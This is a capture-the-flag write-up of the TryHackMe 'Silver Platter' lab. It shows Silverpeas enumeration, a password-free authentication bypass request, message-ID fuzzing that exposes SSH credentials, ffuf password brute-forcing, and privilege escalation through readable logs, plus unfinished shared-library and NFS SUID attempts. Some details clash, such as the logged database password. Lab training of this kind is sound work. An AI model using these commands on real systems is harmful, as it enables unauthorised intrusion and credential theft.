---
description: This is my first documented  CTF style challenge.
---

# Silver Platter (\*\*pending completion on some parts)

Due to the lack of experience and knowledge in this type of challenges; and in the whole offensive security/ethical hacking/penetration testing world, I may make rookie mistakes, or perform unnecessary exploration towards a part of the server that is highly likely to not contain any exploits. Fortunately, I am confident that I will be able to learn a lot from this, and all the subsequent challenges I will be participating in.

{% embed url="https://tryhackme.com/r/room/silverplatter" %}

## Gaining initial foothold

1. ### Run `nmap` on the target IP address

```bash
$ nmap -sS -n -v -Pn [target_ip]
80 ...
8080 ...
22 ... 
```

The results showed that there were 3 open ports: `22`, `80` and `8080`.&#x20;

I started off by enumerating SSH at port 22 first, to find the version number and a potential CVE.

```bash
$ nmap -sV -n -Pn [target_ip]
```

After realizing that port 22 was least likely to be the vulnerable service (probably a rookie mistake for thinking that it was the vulnerable one in the first place :D), I went on to visit the website at port 80 instead

#### Information gathering

After running through the website with interception from Burp suite community, I viewed the sitemap generated (**Target** -> **Site map**), but didn't find any useful information.&#x20;

After reading through the text content present, a particular term: **silverpeas**, and the username **scr1ptkiddy** caught my eye. I decided to research about it.&#x20;

**Silverpeas** is an intranet/extranet software application that can be accessible from a simple web browser.  It can be used to share documents, for content management, etc.

#### Trying to attack the website

From the results obtained in `nmap`above, I tried to lookup for CVEs related to the particular version of **nginx** the web server is running: _**nginx 1.18.0**._&#x20;

I found the following CVE(s):

_**CVE 2021-23017**_

_Details_

[https://www.cvedetails.com/cve/CVE-2021-23017/](https://www.cvedetails.com/cve/CVE-2021-23017/)

_Exploit code_

[https://www.exploit-db.com/exploits/50973](https://www.exploit-db.com/exploits/50973)

I have tried exploiting the service with the found exploit, but to no avail. &#x20;

### 2. Enumerating port 80 with common _silverpeas_ directories

From a quick on Google, I gathered various URL paths that are commonly used on a **silverpeas** application. Using the target IP and port 80 as the main host, I tried visiting the brief list of paths listed below:

1. `/portal`
2. `/portal/login`
3. `admin`
4. `/portal/admin`
5. `/silverpeas`
6. `/silverpeas/portal`

All the paths returned status code _**404**_ (Not found).

### 3. Concentrating my efforts on port 8080 (running Silverpeas)

I decided to start trying to play around with port 8080 instead. I visited the website at port 8080 while behind a Burp suite community proxy. After running a quick `nmap` scan, the results shows that it is running a _**http-proxy**_.

```bash
$ nmap -sV -n -v -Pn -p8080 [target_ip]
```

I went on to try visiting the paths I tried on port 80 previously, and got a positive result for **/silverpeas** (redirection to a login page instead of status code 404).

I decided to run a quick directory gathering scan on the found URL path with `gobuster`. I utilized a few different word-lists found on Kali Linux, along with a few popular ones that is not part of the default installation:

a) /usr/share/wordlists/wfuzz/general/common.txt

b) /usr/share/wordlists/dirb/common.txt

c) DanielMiessler's SecLists ([https://github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists))

```bash
$ gobuster dir --url http://[target_ip]:8080/silverpeas/ -w [wordlist]
```

I found a few positive results ...

### 4. Continuing my adventure on port 8080!

**Searching for CVEs and exploits relating to JSP/2.3**

From the X-powered-by response headers, ...



I tried using a few Metasploit payloads:

a) `exploit/multi/http/struts_include_params`

b) `expoit/multi/http/struts2_content_type_ognl`



#### Further enumeration of the webpage on port 8080

_Inspecting source code_

...



### 5. Further research on &#x53;_&#x69;lverpeas_

After much research, I came across a vulnerability listing regarding **silverpeas** authentication bypass:

{% embed url="https://github.com/advisories/GHSA-4w54-wwc9-x62c" %}

...

...

...



After playing around with the website at port 8080, I returned to Burp suite and looked through the gathered URLs. I found a `POST` request to a path with the _**AuthenticationServlet**_ word present, this prompted me to test out the vulnerability I have found previously.

I sent the request to the Burp suite _repeater_ and modified the request to remove the `Password` field:

```http
POST /silverpeas/AuthenticationServlet 
HTTP/1.1 
Host: <target-url>:8080 

Login=scr1ptkiddy&DomainId=0
```

**Or with cURL**:

```bash
$ curl "http://<target-url>:8080/silverpeas/AuthenticationServlet" -d "Login=scr1ptkiddy&DomainId=0" -H "content-type:application/x-www-form-urlencoded" -v
```



Notice that the `Login` field (presumably the username section) has the value **scr1ptkiddy**, which was found in step 2 (enumerating port 80).

**The response is as follows**:

```http
...

HTTP/1.1 302 Found
Set-Cookie: JSESSIONID=xxx; path=/silverpeas; HttpOnly
Set-Cookie: defaultDomain=0; path=/; ...
Set-Cookie: svpLogin=scr1ptkiddy; path=/; ...
Location: http://<target-url>:8080/silverpeas/Main//look/jsp/MainFrame.jsp
... 
```

Notice that the server returned the following URL value in the `Location` header:

`http://<target-url>:8080/silverpeas/Main//look/jsp/MainFrame.jsp`



The following cookies are found from the `Set-Cookie` response headers from the request above, and must be set in the browser (under the _**Console**_ tab for Google Chrome) for the dashboard to load. If not set, the page will redirect back to the login page (<mark style="color:red;">**\*\***</mark> _the cookie seems to be set automatically when using the proxy browser_):

```javascript
chrome-console> document.cookie = "JSESSIONID=xxx; path=/silverpeas";
chrome-console> document.cookie = "defaultDomain=0; path=/; ...";
chrome-console> document.cookie = "svpLogin=scr1ptkiddy; path=/; ...";
```

I visited the URL, and was navigated to a dashboard at the following URL:

`http://<target-url>:8080/silverpeas/look/jsp/MainFrame.jsp`

Now that we have found the dashboard page, and have the apprioprate cookies set in the browser, we can proceed to enumerate the webpage further, and gather more information. Furthermore, with the cookies set, this means that we are authenticated, and we are able to perform vulnerability exploit that requires authentication.

### How I found the SSH credentials (to gain an unprivileged shell on the server)

`tim`&#x20;

`cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol`



**Method 1: CVE 2023-47323**

{% embed url="https://github.com/RhinoSecurityLabs/CVEs/tree/master/CVE-2023-47323" %}

Note that this method is ran as the regular user _**scr1ptkiddy**_.

Through the proof-of-concept detailed in the link above, I iterated through the URL with different ID values. I found that the ID value of _**6**_ displays the SSH credentials:

`http://10.10.105.62:8080/silverpeas/RSILVERMAIL/jsp/ReadMessage.jsp?ID=6`\


**Testing the results with wfuzz:**

```bash
$ wfuzz -z range,1-100 -u "http://<target-url>:8080/silverpeas/RSILVERMAIL/jsp/ReadMessage.jsp?ID=FUZZ" -H "Cookie: JSESSIONID=xxx; path=/silverpeas; HttpOnly; defaultDomain=0; path=/; ... svpLogin=scr1ptkiddy; path=/; ..." 
```

The results from _**wfuzz**_ showed a bunch of results with the content length (under the _**Chars**_ header in the output) of **13201** and **13202**. Thus, I decided to filter the results to only show those response with more than **13202** characters. (using the `--filter` flag):

```bash
$ wfuzz ... --filter "h>13202"

# further filter can be made with value 13760
$ wfuzz ... --filter "h>13760"
```

The results will either display 2-3 responses, or a single response. By now, it should be clear from the results that the payload value of _**6**_ have the highest content length.&#x20;



**Method 2: Reading the plain-text SSH password in message notification as the user "Manager"**

&#x20;I explored the page and found that there is another user named _**Manager**_, and an administrator named _**Administrateur**_. I tried logging in as the administrator by replacing the _Login_ data field in the _POST_ request with the values: _administrator_, _Administrator_, _administrateur_ and _Administrateur_. The response simply returned the login page URL in the _**Location**_ response headers - indicating a failed login attempt:

I tried to login as the user _Manager_ instead, and received a similar response headers value as before:

```http
POST /silverpeas/AuthenticationServlet 
HTTP/1.1 
Host: <target-url>:8080 

Login=Manager&DomainId=0
```

The only difference in the response is that the _svpLogin_ field in the _Set-Cookie_ cookie changed to **Manager**, and a different _JSESSIONID_ was returned. The _Location_ response headers was the same as with the user **scr1ptkiddy** (...`/silverpeas/Main//look/jsp/MainFrame.jsp`).

After setting the cookie values on the browser console the same way as before, I navigated to the URL (in the _Location_ field of the response headers), and was presented with a dashboard as the user **Manager**. I went on to read the message notifications and found the SSH credentials in plain-text.&#x20;



### 6. Alternative method for initial foothold

**Experimenting with CeWL**

1\. Generating a custom word list

Note: Run against port **80** (Main website) instead of the Silverpeas application at port **8080**.

```bash
$ cewl http://<target_machine_URL>:80 -w passwords.txt
```

2\. Utilizing _**ffuf**_ to use the generated passwords word list to crack the password for the _**scr1ptkiddy**_ user.

```bash
$ ffuf ... -w <wordlist> -u http://<target-url>:8080/silverpeas/AuthenticationServlet -X POST -H "content-type:application/x-www-form-urlencoded" -d "Login=scr1ptkiddy&Password=FUZZ&DomainId=0"
```

A bulk of the responses from _**ffuf**_ appears to have the same status, size, words and lines (as shown from the output format). Thus,  I tried a few methods to possibly filter a positive response:

_**Match status codes 200-209**_

`-mc 200,209`

```bash
$ ffuf -mc 200,209 ...
```

This option does not work. It seems that a positive response also returns the same status code as the negative responses.\


_**Filter regular expression patterns present in response**_

`-fr "ErrorCode"`

_Other possible options_

`-fr "Login"` - does not work since the word _Login_ is present in the positive response

`-fr "Login\?"` - Matches the pattern _Login?_, which is only present in the negative responses

<pre class="language-bash"><code class="lang-bash"><strong>$ ffuf -fr "ErrorCode" ...
</strong></code></pre>

This option works to return a positive match for the password: `adipiscing`. Using the found password with the username scr1ptkiddy allows us to login to the dashboard. The method to retrieve the SSH credentials (refer to the details above - **CVE 2023-47323**) can be applied as the newly authenticated user.

{% embed url="https://jarrettgxz-sec.gitbook.io/penetration-testing-ethical-hacking/tools-services/wordlists/cewl" %}

_**Other CVEs to explore:**_&#x20;

{% embed url="https://rhinosecuritylabs.com/research/silverpeas-file-read-cves/" %}

## Privilege Escalation

{% embed url="https://wiki.debian.org/SystemGroups" %}

### 1. _adm_ group

After running a few enumeration commands ([https://jarrettgxz-sec.gitbook.io/penetration-testing-ethical-hacking/privilege-escalation/linux/enumeration](https://jarrettgxz-sec.gitbook.io/penetration-testing-ethical-hacking/privilege-escalation/linux/enumeration)), I found out that the current user (_**tim**_) is in the _**adm**_ group through the `id` command.

```bash
tim@silver-patter:~$ id
uid=1001(tim) gid=1001(tim) groups=1001(tim),4(adm)
```

The _**adm**_ group permissions allows the current user to read some files in the `/var/log` file. These files may contain sensitive log information, and are usually not readable by common users.

<pre class="language-bash"><code class="lang-bash">tim@silver-patter:~$ cd /var/log

# look for all files with the case-insensitive string "password"
tim@silver-platter:/var/log$ grep -irl --exclude-dir=journal password 2>/dev/null

# print all lines with the case-insensitive string "password"
<strong>tim@silver-platter:/var/log$ grep -ir password 
</strong></code></pre>

Found in `/var/log/auth.log.2:`

`Dec 13 15:45:57 silver-platter sudo: tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name silverpeas -p 8080:8000 -d -e DB_NAME=Silverpeas -e DB_USER=silverpeas -e DB_PASSWORD=10 -v silverpeas-log:/opt/silverpeas/log -v silverpeas-data:/opt/silvepeas/data --link postgresql:database silverpeas:6.3.1`

I tried to access the Postgresql database, but it appears that the common CLI tools associated with Postgesql is not installed on the system.

```bash
$ psql
$ pgcli
$ pgbench
$ pg_restore

...
Command ... not found, but can be installed with:
...
Please ask your administrator
```

Instead, I tried the found password: `_Zd_zx7N823/` on the user _tyler_ via SSH, and _voila_ it worked!

After gaining a shell with the user _tyler_, I ran a few commands to check the privileges of this user. It appears the this user can run all commands with `sudo` privileges. Using the command `sudo su root,` I have gained _**root**_ access.

```bash
# user is in the sudo group
tyler@silver-platter~$ id
uid=1000(tyler) gid=1000(tyler) groups=1000(tyler),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd)


tyler@silver-platter~$ sudo -l
...
...
User tyler may run the following commands on silver-platter:
    (ALL : ALL) ALL
    

tyler@silver-platter~$ sudo su root

root@silver-platter:/home/tyler# 
```

To further my learning, I decided to continue enumerating the system as the user _**tim**_, and try to find other privilege escalation vectors.

### 2. Experimenting with SUID bit

`a) /snap/core20/1974/usr/lib/openssh/ssh-keysign`

`/snap/core20/2264/usr/lib/openssh/ssh-keysign`

are found to call a file with error: `error while loading shared libraries: libcrypto.so.1.1: cannot open shared object file: No such file or directory`

Adding the file to `/tmp` after appending`/tmp` to  `$SHELL` does not work, and the directory: `/snap/core20/[1974/2264]/usr/lib/openssh/`is not writable too



**b)** `/snap/core20/2264/usr/bin/sudo: error while loading shared libraries: libsudo_util.so.0: cannot open shared object file: No such file or directory`

files looks for shared libraries at `LD_LIBRARY_PATH` env variable instead of `PATH`&#x20;

```bash
export LD_LIBRARY_PATH=/tmp:$LD_LIBRARY_PATH
```

```bash
$ ldd /snap/core20/2264/usr/bin/sudo # the other sudo bin and other bin (can't rmb) works too
/snap/core20/2264/usr/bin/sudo: error while loading shared libraries: /tmp/libsudo_util.so.0: file too short
```



```bash
tmp$ gcc -fPIC -c libsudo_util.c -o libsudo_util.o
tmp$ gcc -shared -o libsudo_util.so.0 libsudo_util.o
tmp$ file libsudo_util.o


... python3 server transfer to target
tmp$ mv libsudo_util.o libsudo_util.so.0
```

<pre class="language-bash"><code class="lang-bash"><strong># after creating the shared libary file (above)
</strong><strong>$ ldd /snap/core20/2264/usr/bin/sudo
</strong><strong>...so /lib/x86_64...
</strong><strong>
</strong><strong>$ ls -l /lib
</strong>lrwxrwxrwx 1 root root 7 Aug 10  2023 /lib -> usr/lib

# ** MISSING leading slash
# lib -> usr/lib instead of lib -> /usr/lib (??)

</code></pre>

Perhaps after fixing the issue of running `/snap/core20/2264/usr/bin/sudo` (creating fake shared library, etc.), use the sudo binary to run sudo actions



```bash
$ find / -name "libsudo_util.so.0" 2>/dev/null

$ ls -la 

```

It seems that we have _**rxw**_ permissions for the `libsudo_util.so.0` binary found&#x20;

### 3. `/usr/bin/mount` with _SUID_

Run mountable share (NFS) on attacker hosting shellcode with SUID bit, mount the share from target and execute

Tried to run NFS server on attacker: [https://linuxize.com/post/how-to-install-and-configure-an-nfs-server-on-ubuntu-20-04/](https://linuxize.com/post/how-to-install-and-configure-an-nfs-server-on-ubuntu-20-04/)

There were 3 `mount` binaries found with _SUID_ bit. When trying to mount the share from the attacker machine, we got the error: ...&#x20;

### 4. `/var/log/installer/autoinstall-user-data` (? TO CHECK CORRECT PATH)

Found hashed password: `$6$uJuA1kpnd4kTFniw$/402iWwKzcYD8AMHG6bY/PXwZWOkrrVmtoO7qQpfvVLh1CHmiKUodwMGP7/awDYtrzpDHV8cNbpS1HJ6VMakN.`

According to the room description, the system has a strong password policy. Thus, it will be really difficult and non-viable to try a password brute-force cracking attempt on this hash.&#x20;

### Conclusion

It seems that there is only 1 vector for privilege escalation.
